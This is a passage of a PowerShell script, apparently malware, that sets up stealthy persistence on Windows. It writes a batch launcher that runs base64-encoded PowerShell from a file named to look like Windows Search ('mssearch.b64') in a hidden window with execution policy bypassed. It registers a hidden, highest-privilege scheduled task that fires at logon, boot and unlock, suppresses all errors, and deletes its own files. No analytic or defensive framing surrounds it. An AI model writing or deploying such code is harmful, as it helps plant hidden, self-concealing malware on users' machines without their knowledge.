        $launcherCode = "@echo off`r`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((gc '%~dp0mssearch.b64'))))`""
        Set-Content -Path $launcherBat -Value $launcherCode -Force
        $taskXml2 = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT60S</Delay></BootTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>"' + $launcherBat + '"</Command></Exec></Actions></Task>'
        $xmlFile2 = "$tempDir\task2.xml"
        Set-Content -Path $xmlFile2 -Value $taskXml2 -Encoding Unicode
        & schtasks /create /tn $taskName /xml "$xmlFile2" /f 2>$null
        Remove-Item "$xmlFile2" -Force -EA SilentlyContinue
        Remove-Item -Path $selfHealPs1 -Force -EA SilentlyContinue
        Remove-Item -Path $myPath -Force -EA SilentlyContinue
    } catch {}
}
